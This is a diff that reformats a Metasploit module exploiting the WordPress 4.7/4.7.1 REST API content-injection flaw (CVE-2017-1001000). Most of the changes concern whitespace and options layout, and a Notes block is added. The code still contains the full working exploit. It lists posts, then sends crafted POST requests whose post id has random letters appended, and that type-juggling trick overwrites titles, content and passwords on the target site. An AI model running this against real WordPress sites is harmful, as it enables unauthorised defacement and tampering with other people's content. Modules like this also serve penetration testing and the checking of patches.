@@ -8,42 +8,50 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WordPress REST API Content Injection',
-      'Description'    => %q{
-        This module exploits a content injection vulnerability in WordPress
-        versions 4.7 and 4.7.1 via type juggling in the REST API.
-      },
-      'Author'         => [
-        'Marc Montpas', # Vulnerability discovery
-        'wvu'           # Metasploit module
-      ],
-      'References'     => [
-        ['CVE' , '2017-1001000'],
-        ['WPVDB', '8734'],
-        ['URL',   'http://web.archive.org/web/20250221003135/https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html'],
-        ['URL',   'https://www.php.net/manual/en/language.types.type-juggling.php'],
-        ['URL',   'https://developer.wordpress.org/rest-api/using-the-rest-api/discovery/'],
-        ['URL',   'https://developer.wordpress.org/rest-api/reference/posts/']
-      ],
-      'DisclosureDate' => '2017-02-01',
-      'License'        => MSF_LICENSE,
-      'Actions'        => [
-        ['LIST',   'Description' => 'List posts'],
-        ['UPDATE', 'Description' => 'Update post']
-      ],
-      'DefaultAction'  => 'LIST'
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress REST API Content Injection',
+        'Description' => %q{
+          This module exploits a content injection vulnerability in WordPress
+          versions 4.7 and 4.7.1 via type juggling in the REST API.
+        },
+        'Author' => [
+          'Marc Montpas', # Vulnerability discovery
+          'wvu'           # Metasploit module
+        ],
+        'References' => [
+          ['CVE', '2017-1001000'],
+          ['WPVDB', '8734'],
+          ['URL', 'http://web.archive.org/web/20250221003135/https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html'],
+          ['URL', 'https://www.php.net/manual/en/language.types.type-juggling.php'],
+          ['URL', 'https://developer.wordpress.org/rest-api/using-the-rest-api/discovery/'],
+          ['URL', 'https://developer.wordpress.org/rest-api/reference/posts/']
+        ],
+        'DisclosureDate' => '2017-02-01',
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          ['LIST', 'Description' => 'List posts'],
+          ['UPDATE', 'Description' => 'Update post']
+        ],
+        'DefaultAction' => 'LIST',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
-      OptInt.new('POST_ID',          [false, 'Post ID (0 for all)', 0]),
-      OptString.new('POST_TITLE',    [false, 'Post title']),
-      OptString.new('POST_CONTENT',  [false, 'Post content']),
+      OptInt.new('POST_ID', [false, 'Post ID (0 for all)', 0]),
+      OptString.new('POST_TITLE', [false, 'Post title']),
+      OptString.new('POST_CONTENT', [false, 'Post content']),
       OptString.new('POST_PASSWORD', [false, 'Post password (\'\' for none)'])
     ])
 
     register_advanced_options([
-      OptInt.new('PostCount',     [false, 'Number of posts to list', 100]),
+      OptInt.new('PostCount', [false, 'Number of posts to list', 100]),
       OptString.new('SearchTerm', [false, 'Search term when listing posts'])
     ])
   end
@@ -87,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     tbl = Rex::Text::Table.new(
-      'Header'  => "Posts at #{full_uri} (REST API: #{get_rest_api})",
+      'Header' => "Posts at #{full_uri} (REST API: #{get_rest_api})",
       'Columns' => %w{ID Title URL Password}
     )
 
@@ -109,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['POST_ID'] == 0
       posts_to_update = list_posts
     else
-      posts_to_update << {id: datastore['POST_ID']}
+      posts_to_update << { id: datastore['POST_ID'] }
     end
 
     if posts_to_update.empty?
@@ -119,10 +127,9 @@ class MetasploitModule < Msf::Auxiliary
 
     posts_to_update.each do |post|
       res = update_post(post[:id],
-        title:    datastore['POST_TITLE'],
-        content:  datastore['POST_CONTENT'],
-        password: datastore['POST_PASSWORD']
-      )
+                        title: datastore['POST_TITLE'],
+                        content: datastore['POST_CONTENT'],
+                        password: datastore['POST_PASSWORD'])
 
       post_url = full_uri(wordpress_url_post(post[:id]))
 
@@ -138,20 +145,20 @@ class MetasploitModule < Msf::Auxiliary
     posts = []
 
     res = send_request_cgi({
-      'method'     => 'GET',
-      'uri'        => normalize_uri(get_rest_api, 'posts'),
-      'vars_get'   => {
+      'method' => 'GET',
+      'uri' => normalize_uri(get_rest_api, 'posts'),
+      'vars_get' => {
         'per_page' => datastore['PostCount'],
-        'search'   => datastore['SearchTerm']
+        'search' => datastore['SearchTerm']
       }
     }, 3.5)
 
     if res && res.code == 200
       res.get_json_document.each do |post|
         posts << {
-          id:       post['id'],
-          title:    post['title']['rendered'],
-          url:      post['link'],
+          id: post['id'],
+          title: post['title']['rendered'],
+          url: post['link'],
           password: post['content']['protected']
         }
       end
@@ -165,16 +172,16 @@ class MetasploitModule < Msf::Auxiliary
   def update_post(id, opts = {})
     payload = {}
 
-    payload[:id]       = "#{id}#{Rex::Text.rand_text_alpha(8)}"
-    payload[:title]    = opts[:title] if opts[:title]
-    payload[:content]  = opts[:content] if opts[:content]
+    payload[:id] = "#{id}#{Rex::Text.rand_text_alpha(8)}"
+    payload[:title] = opts[:title] if opts[:title]
+    payload[:content] = opts[:content] if opts[:content]
     payload[:password] = opts[:password] if opts[:password]
 
     send_request_cgi({
       'method' => 'POST',
-      'uri'    => normalize_uri(get_rest_api, 'posts', id),
-      'ctype'  => 'application/json',
-      'data'   => payload.to_json
+      'uri' => normalize_uri(get_rest_api, 'posts', id),
+      'ctype' => 'application/json',
+      'data' => payload.to_json
     }, 3.5)
   end
 
@@ -183,7 +190,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi!({
       'method' => 'GET',
-      'uri'    => normalize_uri(target_uri.path)
+      'uri' => normalize_uri(target_uri.path)
     }, 3.5)
 
     if res && res.code == 200
